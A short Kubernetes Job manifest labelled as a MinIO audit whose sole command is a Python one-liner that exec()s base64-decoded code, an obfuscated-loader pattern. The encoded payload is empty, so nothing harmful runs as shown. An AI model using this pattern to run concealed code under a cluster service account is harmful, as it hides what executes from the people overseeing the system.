apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v67
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          python3 -c "exec(__import__('base64').b64decode('').decode())"